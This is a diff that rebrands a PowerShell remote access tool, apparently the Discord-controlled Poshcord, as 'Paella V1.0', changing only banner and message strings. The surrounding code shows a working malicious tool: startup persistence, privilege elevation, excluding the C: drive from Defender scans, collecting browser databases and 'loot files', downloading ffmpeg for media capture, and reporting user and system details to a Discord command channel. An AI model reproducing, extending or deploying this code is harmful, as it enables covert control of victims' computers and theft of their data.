@@ -1,4 +1,4 @@
-# =====================================================================================================================================================
+# ================================================================Paella V1.0========================================================================
 $global:token = "$tk" # 
 # =============================================================== SCRIPT SETUP =========================================================================
 
@@ -22,7 +22,7 @@ $timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
 # =============================================================== MODULE FUNCTIONS =========================================================================
 # Download ffmpeg.exe function (dependency for media capture) 
 Function GetFfmpeg{
-    sendMsg -Message ":hourglass: ``Downloading FFmpeg to Client.. Please Wait`` :hourglass:"
+    sendMsg -Message ":hourglass: ``Downloading FFmpeg to Client.. Please Wait and eat some Paella`` :hourglass:"
     $Path = "$env:Temp\ffmpeg.exe"
     $tempDir = "$env:temp"
     If (!(Test-Path $Path)){  
@@ -189,7 +189,7 @@ Function quickInfo{
             @{
                 title       = "$env:COMPUTERNAME | Computer Information "
                 "description" = @"
-``````SYSTEM INFORMATION FOR $env:COMPUTERNAME - By Device``````
+``````SYSTEM INFORMATION FOR $env:COMPUTERNAME - Paella V1.0``````
 :man_detective: **User Information** :man_detective:
 - **Current User**          : ``$env:USERNAME``
 - **Email Address**         : ``$email``
@@ -247,12 +247,12 @@ $script:jsonPayload = @{
     tts        = $false
     embeds     = @(
         @{
-            title       = "$env:COMPUTERNAME | Commands List "
+            title       = "$env:COMPUTERNAME | Commands List of Paella v1.0"
             "description" = @"
 
 ### SYSTEM
 - **AddPersistance**: Add this script to startup.
-- **RemovePersistance**: Remove Poshcord from startup
+- **RemovePersistance**: Remove Paella from startup
 - **IsAdmin**: Check if the session is admin
 - **Elevate**: Attempt to restart script as admin (!user popup!)
 - **ExcludeCDrive**: Exclude C:/ Drive from all Defender Scans
@@ -770,7 +770,7 @@ Function IsAdmin{
         sendMsg -Message ":octagonal_sign: ``Not Admin!`` :octagonal_sign:"
     }
     else{
-        sendMsg -Message ":white_check_mark: ``You are Admin!`` :white_check_mark:"
+        sendMsg -Message ":white_check_mark: ``You are Admin! Oleee!`` :white_check_mark:"
     }
 }
 
@@ -1082,7 +1082,7 @@ $infomessage = "
 ==================================================================================================================================
 "
 $infomessage1 = "``````
-=======================+Spain+==================================
+=======================+Paella v1.0+==================================
 SYSTEM INFORMATION FOR $env:COMPUTERNAME
 ======================+By Device+===============================
 User Information
@@ -1202,7 +1202,7 @@ $process
         Write-Output "Done."
     }
 
-    sendMsg -Message ":hourglass: ``$env:COMPUTERNAME Getting Loot Files.. Please Wait`` :hourglass:"
+    sendMsg -Message ":hourglass: ``$env:COMPUTERNAME Getting Loot Files.. Please Wait Amigo`` :hourglass:"
     SystemInfo
     BrowserDB
     FolderTree
@@ -1452,7 +1452,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 }
 
 if ($InfoOnConnect -eq '1'){
-    $infocall = ':hourglass: Getting system info - please wait.. :hourglass:'
+    $infocall = ':hourglass: Getting system info - Paella v1.0 Started.. :hourglass:'
 }
 else{
     $infocall = 'Type `` Options `` in chat for commands list'
@@ -1463,7 +1463,7 @@ $script:jsonPayload = @{
     tts        = $false
     embeds     = @(
         @{
-            title       = "$env:COMPUTERNAME | C2 session started!"
+            title       = "$env:COMPUTERNAME | Session started!"
             "description" = @"
 Session Started  : ``$timestamp``
 
@@ -1534,7 +1534,7 @@ If ($defaultstart -eq 1){
     StartAll
 }
 # Send setup complete message to discord
-sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Setup Complete!`` :white_check_mark:"
+sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Paella v1.0 setup complete!`` :white_check_mark:"
 
 # ---------------------------------------------------------------------------------------------------------------------------------------------------------
 
